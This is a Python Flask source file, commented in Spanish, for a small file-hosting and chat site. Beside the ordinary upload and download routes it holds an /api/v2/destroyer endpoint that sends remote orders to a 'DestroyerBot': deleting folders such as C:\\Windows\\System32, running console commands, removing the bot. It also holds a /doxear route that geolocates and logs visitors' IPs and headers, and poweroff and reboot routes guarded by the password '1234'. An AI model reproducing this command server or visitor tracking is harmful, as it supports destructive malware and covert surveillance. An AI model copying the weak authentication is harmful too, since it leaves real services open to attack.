from os import system
import os, signal, traceback
import requests, json
from werkzeug.utils import secure_filename
from Databases.tooldb import (
    ENCRIPT,
    DESENCRIPT,
    INSERT_DB,
    ALL_USERS,
    SEARCH_DB,
    VALIDAR,
    DELETE,
    EDITAR,
    CONNECTION_TEST,
)
from flask import (
    Flask,
    request,
    render_template,
    redirect,
    url_for,
    jsonify,
    Response,
    flash,
    session,
    send_file,
    send_from_directory,
    make_response,
)
from flask_socketio import SocketIO, emit, send

# from flask_cors import CORS, cross_origin
import sqlite3
from Modules import CONFIG
import jwt, datetime, time, sys

from dotenv import load_dotenv

from termcolor import colored
import logging
import Modules.LOGGER


datosmsg = []
datosmsg_all = []

app = Flask(__name__, template_folder="web")
app.secret_key = CONFIG.SECRECT
app.config["UPLOAD_FOLDER"] = CONFIG.RUTE
log = logging.getLogger("WEB")
load_dotenv("config.env")


log.info(f"SERVIDOR INICIADO EN: {CONFIG.MY_OS}")
CONNECTION_TEST()


######################## WEB ########################


@app.route("/")
def index():
    if request.method == "GET":
        ip_client = request.headers.get("X-Real-IP")
        try:
            try:
                uid= session["user"]
                suid = SEARCH_DB("ID", uid)
                uss = suid[1]
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    log.info(f"[{ip_client}] [/ ] Token valido [{uss}]")
                    return render_template("app/index.html", user=uss)
                except jwt.ExpiredSignatureError:
                    log.debug(f"[{ip_client}] [/ ] Token expirado")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(f"[{ip_client}] [/ ] Token invalido")
                    return redirect(url_for("login"))
            else:
                log.debug(f"[{ip_client}] [/ ] No hay usuario en sesion")
                return render_template("index2.html")
        except Exception as e:
            log.debug(f"[{ip_client}] [/ ] ERROR: {e} [{traceback.format_exc()}]")
            return render_template("index2.html")


@app.route("/login", methods=["POST", "GET"])
def login():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        correo = request.form.get("email")
        passw = request.form.get("passw")
        key = app.config.get("SECRET_KEY")
        if not correo.__contains__("'"):
            if VALIDAR(correo, passw, key) == True:
                if not correo.__contains__("@"):
                    userXD = SEARCH_DB("USER", correo)
                    datos_send_token = {
                        "exp": datetime.datetime.utcnow()
                        + datetime.timedelta(days=30, minutes=13, seconds=0),
                        "iat": datetime.datetime.utcnow(),
                        "EMAIL": userXD[2],
                    }
                    eltoken = jwt.encode(
                        datos_send_token,
                        app.config.get("SECRET_KEY"),
                        algorithm="HS256",
                    )
                    session["user"] = userXD[0]
                    session["token"] = eltoken
                    log.info(f"[{ip_client}] [/login ] Usuario [{userXD[1]}] logueado correctamente")
                    return redirect(url_for("index"))
                else:
                    mailXD = SEARCH_DB("EMAIL", correo)
                    datos_send_token = {
                        "exp": datetime.datetime.utcnow()
                        + datetime.timedelta(days=30, minutes=13, seconds=0),
                        "iat": datetime.datetime.utcnow(),
                        "EMAIL": ENCRIPT(mailXD[2], app.config("SECRET_KEY")),
                    }
                    eltoken = jwt.encode(
                        datos_send_token,
                        app.config.get("SECRET_KEY"),
                        algorithm="HS256",
                    )
                    session["user"] = mailXD[0]
                    session["token"] = eltoken
                    log.info(f"[{ip_client}] [/login ] Usuario [{mailXD[1]}] logueado correctamente")
                    return redirect(url_for("index"))
            else:
                ERROR = "USUARIO/CORREO O CONTRASEÑA INCORRECTOS, SI NO RECUERDA SU CONTRASEÑA CLICk "
                log.debug(f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos")
                return render_template("auth/log-in_layout.html", prueba=ERROR)

        else:
            ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
            log.debug(f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos [comillas]")
            return render_template("auth/log-in_layout.html", prueba2=ERROR)

    else:
        log.debug(f"[{ip_client}] [/login ] [metodo GET]")
        return render_template("auth/log-in_layout.html")


@app.route("/regist", methods=["POST", "GET"])
def regist():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        usuario = request.form.get("username")
        correo = request.form.get("email")
        passw = request.form.get("passw")
        if not usuario.__contains__("'"):
            if not usuario.__contains__("@"):
                if not correo.__contains__("'"):
                    EPASSW = ENCRIPT(passw, app.config.get("SECRET_KEY"))
                    respuesta = INSERT_DB(usuario, correo, EPASSW)
                    if respuesta == "USUARIO [{usuario}] CREADO CORRECTAMENTE":
                        log.info(f"[{ip_client}] [/regist ] Usuario {usuario} creado correctamente")
                        return redirect(url_for("login"))
                    else:
                        log.debug(
                            f"[{ip_client}] [/regist ] Usuario {usuario} NO CREADO {respuesta}"
                        )
                        return render_template(
                            "auth/sign-up_layout.html", prueba=respuesta
                        )
                else:
                    ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
                    log.debug(
                        f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]"
                    )
                    return render_template("auth/sign-up_layout.html", prueba2=ERROR)
            else:
                ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER @"
                log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [@]")
                return render_template("auth/sign-up_layout.html", prueba2=ERROR)
        else:
            ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
            log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]")
            return render_template("auth/sign-up_layout.html", prueba2=ERROR)
    else:
        log.debug(f"[{ip_client}] [/regist ] [metodo GET]")
        return render_template("auth/sign-up_layout.html")


@app.route("/logout", methods=["POST", "GET"])
def logout():
    ip_client = request.headers.get("X-Real-IP")
    user = session["user"]
    log.info(f"[{ip_client}] [/logout ] Usuario [{user}] cerrando sesion")
    session.pop("user", None)
    session.pop("token", None)
    return redirect(url_for("index"))


@app.route("/favicon.ico")
def favicon():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_os = CONFIG.MY_OS
        if the_os == "Windows":
            the_path = f"{CONFIG.SYSTEM_PATH}\static"
        else:
            the_path = f"{CONFIG.SYSTEM_PATH}/static"
        return send_from_directory(the_path, "favicon.png", as_attachment=False)
    except Exception as e:
        log.error(f"[{ip_client}] [/icon ] [ERROR] {e}")
        return redirect(url_for("index"))


@app.route("/robots.txt")
def robots_txt():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_os = CONFIG.MY_OS
        if the_os == "Windows":
            the_path = f"{CONFIG.SYSTEM_PATH}\static\extra"
        else:
            the_path = f"{CONFIG.SYSTEM_PATH}/static/extra"
        log.debug(f"[{ip_client}] [/robots.txt ] [OK]")
        return send_from_directory(the_path, "robots.txt", as_attachment=False)
    except Exception as e:
        log.error(f"[{ip_client}] [/robots.txt ] [ERROR] {e}")
        return redirect(url_for("index"))


@app.route("/sitemap.xml")
def sitemap_xml():
    ip_client = request.headers.get("X-Real-IP")
    try:
        the_os = CONFIG.MY_OS
        if the_os == "Windows":
            the_path = f"{CONFIG.SYSTEM_PATH}\static\extra"
        else:
            the_path = f"{CONFIG.SYSTEM_PATH}/static/extra"
        log.debug(f"[{ip_client}] [/sitemap.xml ] [OK]")
        return send_from_directory(the_path, "sitemap.xml", as_attachment=False)
    except Exception as e:
        log.error(f"[{ip_client}] [/sitemap.xml ] [ERROR] {e}")
        return redirect(url_for("index"))


@app.route("/download")
def download():
    ip_client = request.headers.get("X-Real-IP")
    if request.args.get("file"):
        try:
            try:
                uid= session["user"]
                suid = SEARCH_DB("ID", uid)
                uss = suid[1]
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    archive = request.args.get("file")
                    the_os = CONFIG.MY_OS
                    if the_os == "Windows":
                        the_path = f'{app.config.get("UPLOAD_FOLDER")}\{uid}'
                    else:
                        the_path = f'{app.config.get("UPLOAD_FOLDER")}/{uid}'
                    log.info(
                        f"[{ip_client}] [/download ] Usuario [{uss}] descargando archivo [{archive}]"
                    )
                    return send_from_directory(the_path, archive, as_attachment=False)
                except jwt.ExpiredSignatureError:
                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token [{token}]")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido [{token}]")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                    return redirect(url_for("download"))

            else:
                log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
                return redirect(url_for("login"))
        except:
            log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
            return redirect(url_for("login"))

    elif request.args.get("token"):
        the_token = request.args.get("token")
        try:
            verific = jwt.decode(
                the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            print(verific)
            archive = verific["archive"]
            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
            suid = SEARCH_DB("ID", user_token)
            uss = suid[1]
            the_os = CONFIG.MY_OS
            if the_os == "Windows":
                the_path = f'{app.config.get("UPLOAD_FOLDER")}\{user_token}'
            else:
                the_path = f'{app.config.get("UPLOAD_FOLDER")}/{user_token}'
            log.info(
                f"[{ip_client}] [/download ] Usuario [{uss}] descargando archivo [{archive}]"
            )
            return send_from_directory(the_path, archive, as_attachment=False)
        except jwt.ExpiredSignatureError:
            log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
            return redirect(url_for("login"))
        except jwt.InvalidTokenError:
            log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
            return redirect(url_for("login"))
        except Exception as e:
            log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("download"))

    elif request.args.get("f_file"):
        the_token = request.args.get("f_file")
        try:
            verific = jwt.decode(
                the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            archive = verific["archive"]
            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
            suid = SEARCH_DB("ID", user_token)
            uss = suid[1]
            the_os = CONFIG.MY_OS
            if the_os == "Windows":
                the_path = f'{app.config.get("UPLOAD_FOLDER")}\{user_token}'
            else:
                the_path = f'{app.config.get("UPLOAD_FOLDER")}/{user_token}'
            log.info(
                f"[{ip_client}] [/download ] Usuario [{uss}] descargando archivo [{archive}]"
            )
            return send_from_directory(the_path, archive, as_attachment=True)
        except jwt.ExpiredSignatureError:
            log.debug(f"[{ip_client}] [/download ] Usuario {uss} expirón token {token}")
            return redirect(url_for("login"))
        except jwt.InvalidTokenError:
            log.debug(f"[{ip_client}] [/download ] Usuario {uss} token invalido {token}")
            return redirect(url_for("login"))
        except Exception as e:
            log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("download"))
    else:
        try:
            try:
                uid= session["user"]
                suid = SEARCH_DB("ID", uid)
                uss = suid[1]
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    the_os = CONFIG.MY_OS
                    if the_os == "Windows":
                        dir = f'{app.config.get("UPLOAD_FOLDER")}\{uid}'
                        if os.path.isdir(dir) == False:
                            os.mkdir(dir)
                    else:
                        dir = f'{app.config.get("UPLOAD_FOLDER")}/{uid}'
                        if os.path.isdir(dir) == False:
                            os.mkdir(dir)
                    archives = os.listdir(dir)
                    file = []
                    S_KEY = app.config.get("SECRET_KEY")
                    USER_ENCRIPT = ENCRIPT(str(uid), S_KEY)
                    for archive in archives:
                        file_size = CONFIG.SPACE_FILE(uid, archive)
                        datos_send_token = {
                            "user": USER_ENCRIPT,
                            "archive": archive,
                            "file_size": file_size,
                        }
                        the_token = jwt.encode(
                            datos_send_token,
                            app.config.get("SECRET_KEY"),
                            algorithm="HS256",
                        )
                        file.append([archive, the_token, file_size])
                    sorted_file = sorted(file, key=lambda x: x[0])
                    log.debug(f"[{ip_client}] [/download ] [method GET] Usuario {uss}")
                    return render_template(
                        "files/download.html",
                        user=uss,
                        url=dir,
                        files=sorted_file,
                        space=CONFIG.Free_Space,
                    )

                except jwt.ExpiredSignatureError:
                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
                    return redirect(url_for("login"))
            
            else:
                log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
                return redirect(url_for("login"))
            
        except Exception as e:
            log.error(f"[{ip_client}] [/download ] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))


@app.route("/upload", methods=["POST", "GET"])
def upload():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        try:
            try:
                uid= session["user"]
                suid = SEARCH_DB("ID", uid)
                uss = suid[1]
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    if request.files["file"]:
                        file = request.files["file"]
                    else:
                        return redirect(url_for("upload"))
                    filename = secure_filename(file.filename)
                    the_os = CONFIG.MY_OS
                    if the_os == "Windows":
                        DIR = f'{app.config.get("UPLOAD_FOLDER")}\{uid}'
                        if os.path.isdir(DIR) == False:
                            os.mkdir(DIR)
                        the_path = f"{DIR}\{filename}"
                    else:
                        DIR = f'{app.config.get("UPLOAD_FOLDER")}/{uid}'
                        if os.path.isdir(DIR) == False:
                            os.mkdir(DIR)
                        the_path = f'{app.config.get("UPLOAD_FOLDER")}/{uid}/{filename}'

                    file_path = the_path
                    file.save(file_path)
                    log.info(f"[{ip_client}] [/upload ] Usuario [{uss}] subión archivo [{filename}]")
                    return redirect(url_for("download"))
                except jwt.ExpiredSignatureError:
                    log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}]  expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}]  token invalido")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.error(f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                    return redirect(url_for("login"))
            else:
                log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                return redirect(url_for("login"))
        except Exception as e:
            log.error(f"[{ip_client}] [/upload] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))
    else:
        try:
            try:
                uid= session["user"]
                suid = SEARCH_DB("ID", uid)
                uss = suid[1]
                token = session["token"]
                sessions = True
            except:
                uss = None
                token = None
                sessions = False
            if sessions == True:
                try:
                    verific = jwt.decode(
                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                    )
                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario {uss} logueado")
                    return render_template(
                        "files/upload.html", user=uss, space=CONFIG.Free_Space
                    )

                except jwt.ExpiredSignatureError:
                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] expirón token")
                    return redirect(url_for("login"))
                except jwt.InvalidTokenError:
                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] token invalido")
                    return redirect(url_for("login"))
                except Exception as e:
                    log.warning(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] error {e}")
                    return redirect(url_for("login"))
            else:
                log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                return redirect(url_for("login"))
        except Exception as e:
            log.error(f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))


@app.route("/delete")
def delete():
    ip_client = request.headers.get("X-Real-IP")
    if request.args.get("del_file"):
        try:
            the_token = request.args.get("del_file")
            verific = jwt.decode(
                the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            archive = verific["archive"]
            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
            suid = SEARCH_DB("ID", user_token)
            uss = suid[1]
            the_os = CONFIG.MY_OS
            if the_os == "Windows":
                the_path = f'{app.config.get("UPLOAD_FOLDER")}\{user_token}\{archive}'
            else:
                the_path = f'{app.config.get("UPLOAD_FOLDER")}/{user_token}/{archive}'
            os.remove(the_path)
            log.info(f"[{ip_client}] [/delete ] Usuario [{uss}] borrón archivo [{archive}]")
            return redirect(url_for("download"))
        except jwt.ExpiredSignatureError:
            log.debug(f"[{ip_client}] [/delete ] Usuario [{uss}] expirón token")
            return redirect(url_for("login"))
        except jwt.InvalidTokenError:
            log.debug(f"[{ip_client}] [/delete ] Usuario [{uss}] token invalido")
            return redirect(url_for("login"))
        except Exception as e:
            log.error(f"[{ip_client}] [/delete ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
            return redirect(url_for("login"))
    else:
        log.debug(f"[{ip_client}] [/delete ] [method GET]")
        return redirect(url_for("download"))


@app.route("/details")
def detalles():
    return "en proceso"
    # return render_template('blog.html')


@app.route("/layout")
def layout():
    return render_template("layout.html")


@app.route("/services")
def servicios():
    return "en proceso"
    # return render_template('services.html')


@app.route("/news")
def nuevo():
    return "en proceso"
    # return render_template('blog.html')


@app.route("/contact")
def contactar():
    return "en proceso"
    # return render_template('contact.html')


@app.route("/conditions")
def ter_y_co():
    return "en proceso"
    #return render_template("auth/terms-conditions.html")


@app.route("/privacy")
def privacy():
    return "en proceso"
    # return render_template('/auth/privacy-policy.html')


@app.route("/poweroff", methods=["POST", "GET"])
def poweroff():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        passw = request.form.get("pass")
        if passw == "1234":
            log.warning(f"[{ip_client}] [/poweroff ] [method POST] apagando")
            os.kill(os.getpid(), signal.SIGINT)
            return "apagando XD"
        else:
            log.warning(f"[{ip_client}] [/poweroff ] [method POST] nop XD")
            return "nop XD"
    else:
        form = "<form action='/poweroff' method='POST'>\
        <input id='pass' type='password' name='pass'>\
        <input type='submit' name='send'></form>"
        return form


@app.route("/reboot", methods=["POST", "GET"])
def reboot():
    ip_client = request.headers.get("X-Real-IP")
    if request.method == "POST":
        passw = request.form.get("pass")
        if passw == "1234":
            log.warning(f"[{ip_client}] [/reboot ] [method POST] reiniciando")
            os.execv(sys.executable, ["python"] + sys.argv)
            return "reiniciando XD"
        else:
            log.warning(f"[{ip_client}] [/reboot ] [method POST] nop XD")
            return "nop XD"
    else:
        form = "<form action='/reboot' method='POST'>\
        <input id='pass' type='password' name='pass'>\
        <input type='submit' name='send'></form>"
        return form


@app.route("/setcookie", methods=["POST", "GET"])
def setcookie():
    resp = make_response()
    resp.set_cookie("userID", "XD")

    return resp


@app.route("/dev", methods=["POST", "GET"])
def dev():
    return render_template("index.html")

@app.route("/doxear", methods=["POST", "GET"])
def doxear():
    client_ip = request.headers.get("X-Real-IP")
    headers = request.headers
    localis = requests.get(f"http://ip-api.com/json/{client_ip}")
    localis = localis.json()
    log.critical(f"[/doxear ] [method GET] [ip] {client_ip} [headesrs] {headers} [localis] {localis} ")
    
    return f"<h1>Hola {client_ip} </h1> <h2> Headers: {headers} </h2> <h3> Localis: {localis} </h3>"

################### API/v1 #######################

@app.route("/api/auth", methods=["POST", "GET"])
def apiauth_v1():
    try:
        auth = request.get_json()
        auth_user = auth["USER"]
        auth_email = auth["EMAIL"]
        auth_passw = auth["PASSW"]
        print(auth_user, auth_email, auth_passw)

        key = app.config.get("SECRET_KEY")
        E_EMAIL = ENCRIPT(auth_email, key)
        E_PASSW = ENCRIPT(auth_passw, key)
        if VALIDAR(auth_user, auth_passw, key) == True:
            datos_send_token = {
                "exp": datetime.datetime.utcnow()
                + datetime.timedelta(days=0, minutes=13, seconds=0),
                "iat": datetime.datetime.utcnow(),
                "USER": auth_user,
                "EMAIL": E_EMAIL,
                "PASSW": E_PASSW,
            }

            eltoken = jwt.encode(
                datos_send_token, app.config.get("SECRET_KEY"), algorithm="HS256"
            )

            allb = {"@all": f"bot:@{auth_user} se a unido"}
            datosmsg_all.append(allb)
            userb = {f"@{auth_user}": "bot:bienvenido al chat"}
            datosmsg.append(userb)

            return jsonify({"TOKEN": f"{eltoken}"})
        else:
            status = 401
            return jsonify({"ERROR": "DATOS DE AUTENTIFICACION INCORRECTOS"}), status
    except:
        status = 400
        return jsonify({"ERROR": "BAD REQUEST"}), status


@app.route("/api/msg", methods=["POST", "GET"])
def apimsg():
    if request.method == "POST":
        try:
            try:
                token = request.get_json()
                auth_token = token["TOKEN"]
                datos = token["DATOS"]

            except:
                auth_token = ""
                datos = ""

            verificador = jwt.decode(
                auth_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
            )
            print("TOKEN:", verificador["USER"], "\nMSG:", datos)
            try:
                if datos["@all"]:
                    datosmsg_all.append(datos)
            except:
                datosmsg.append(datos)
            print(datosmsg)
            return jsonify({"VALIDO": f"DATOS RESIVIDOS CORRECTAMENTE :) "})
        except jwt.ExpiredSignatureError:
            print("expiro")
            status = 403
            return jsonify({"ERROR": "EL TOKEN EXPIRO"}), status
        except jwt.InvalidTokenError:
            print("Invalid token. Please log in again.")
            status = 401
            return jsonify({"ERROR": "TOKEN INVALIDO"}), status

    else:
        larespuesta = datosmsg_all, datosmsg
        return jsonify({"VALIDO": larespuesta})

#################### API/v2 ######################

#Auth v2
@app.route("/api/v2/auth", methods=["POST", "GET"])
def apiauth_v2():
    try:
        pass
    except:
        pass


@app.route("/api/v2/destroyer", methods=["POST", "GET"])
def destroyer_bot():
    ip_client = request.headers.get("X-Real-IP")
    try:
        if request.method == "POST":  
            user_agent = request.headers.get("User-Agent")
            if user_agent == "DestroyerBot":
                try:
                    data = request.get_json()
                    if data["Response"] == True:
                        # Registrar el mensaje enviado por el bot
                        log.warning(f"[/api/v2/destroyer ] [method POST] Mensaje recibido desde {ip_client}: {data['Response_Text']}")
                except:
                    data = None
                
                    
                response_data = {
                "DestroyerCall": False,
                "kill_Personal_Carpet": False,
                "Kill_Spesific_Folder": False,
                "Folders_Route": ["C:\\Windows\\System32"],
                "Delete_Bot": False,
                "Stop_Bot": False,
                "Execute_Console": True,
                "Console_command": ["ping google.com -c3"]
                }
                log.info(f"[/api/v2/destroyer ] [method POST] DestroyerBot {ip_client} con User-Agent {user_agent}, {data}")
                return jsonify(response_data)
            else:
                log.warning(f"[/api/v2/destroyer ] [method POST] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
                return jsonify({"error": "Forbidden"}), 403
        else:
            ip_client = request.headers.get("X-Real-IP")
            log.warning(f"[/api/v2/destroyer ] [method GET] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
            headers = request.headers
            return f"{headers}"        
        
    except Exception as e:
        log.error(f"[/api/v2/destroyer ] Error al procesar la petición: {e} [{traceback.format_exc()}]")
        return jsonify({"error": "Internal server error"}), 500


#################### SoketIO #####################
# Para que funcione bien, debes instalar el paquete Flask-SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")


@socketio.on("connect")
def test_connect():
    print("Cliente conectado")
    log.debug("Cliente conectado")
    # Aquí puedes hacer lo que quieras con la conexión
    # Ejemplo: enviar un mensaje al cliente que se conecté
    #
    emit("after connect", {"data": "Lets dance"})


@socketio.on("opcion")
def handle_opcion(opcion):
    print("Recibida opción: " + opcion)
    log.debug("Recibida opción: " + opcion)
    # Aquí puedes hacer lo que quieras con la opción recibida
    emit("mensaje", "Has seleccionado la opción " + opcion)


@socketio.on("boton")
def handle_boton(estado):
    print("Recibido estado del botón: " + estado)
    log.debug("Recibido estado del botón: " + estado)
    # Aquí puedes hacer lo que quieras con el estado del botón
    emit("mensaje", "El botón está " + estado)


# Cambia la lógica del manejador para el evento 'boton normal'
@socketio.on("boton normal")
def handle_boton_normal(estado):
    print("Recibido estado del botón normal: " + estado)
    log.debug("Recibido estado del botón normal: " + estado)
    # Envía el mensaje según el estado recibido
    emit("mensaje", "Se ha clicado el botón normal y ahora está " + estado)


# Añade una función decorada con @socketio.on('texto')
@socketio.on("texto")
def handle_texto(texto):
    print("Recibido texto: " + texto)
    log.debug("Recibido texto: " + texto)
    # Añade una estructura condicional para enviar una respuesta diferente según el texto
    if texto == "hola":
        emit("respuesta", "Hola, ¿qué tal?")

    elif texto == "/start":
        emit("respuesta", "Hola, XD")

    elif texto == "/quit":
        emit("respuesta", "Adiós, hasta pronto")

    elif texto == "XD":
        emit("respuesta", "Jaja, muy gracioso")

    elif texto == "/help":
        emit("respuesta", "Escribe hola o XD")

    else:
        emit("respuesta", "No entiendo lo que dices")


@app.route("/test")
def config():
    return render_template("app/socket.html")


values = {
    "slider1": 25,
    "slider2": 0,
}


@socketio.on("Slider value changed")
def handle_slider_change(message):
    # receive the slider value change from the client
    print("received slider value change: " + str(message))
    # update the values dictionary with the new value
    values[message["who"]] = message["data"]
    # emit the updated value to all the connected clients
    emit("update value", message, broadcast=True)


@app.route("/test1")
def slider():
    return render_template(
        "app/test.html", slider1=values["slider1"], slider2=values["slider2"]
    )


@socketio.on("message")
def Text_MSG(msg):
    print("text-message: " + msg)
    send(msg, broadcast=True)


@app.route("/test2")
def chat():
    return render_template("app/chat.html", **values)


if __name__ == "__main__":
    # run app in debug mode on port 5000' ssl_context=(cert_ssl, priv_ssl),
    # cert_ssl = 'CERT/fullchain.pem' priv_ssl = 'CERT/privkey.pem'

    DEBUG = True if os.getenv("DEBUG") == "True" else False
    app.run(threaded=True, host="0.0.0.0", port=9001, debug=DEBUG)
